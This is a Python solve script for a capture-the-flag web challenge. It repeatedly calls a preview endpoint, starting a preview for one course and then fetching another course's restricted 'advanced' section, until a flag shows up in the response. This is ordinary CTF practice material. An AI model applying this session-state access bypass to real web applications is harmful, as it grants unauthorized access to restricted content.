import re
import time
import requests

BASE = "http://bmnzdgnsz2l4.playat.flagyard.com/"
INDEX = BASE + "index.php"
PREVIEW = BASE + "preview.php"

FLAG_RE = re.compile(r"Flag:\s*([A-Za-z0-9_\-\{\}]+)")

def attempt(session: requests.Session):
    r = session.get(
        INDEX,
        params={"action": "start_preview", "course_id": 1, "section": "intro"},
        allow_redirects=True,
        timeout=5,
    )

    session.get(
        PREVIEW,
        params={"course_id": 2, "section": "intro"},
        timeout=5,
    )

    r = session.get(
        PREVIEW,
        params={"course_id": 2, "section": "advanced"},
        timeout=5,
    )

    m = FLAG_RE.search(r.text)
    if m:
        return m.group(1)
    return None

def main():
    s = requests.Session()
    s.headers.update({"User-Agent": "ctf-runner/1.0"})

    tries = 0
    start = time.time()
    while True:
        tries += 1
        flag = attempt(s)
        if flag:
            elapsed = time.time() - start
            print(f"[+] Got flag in {tries} tries, {elapsed:.2f}s total")
            print(f"[FLAG] {flag}")
            break
        time.sleep(0.03)

if __name__ == "__main__":
    main()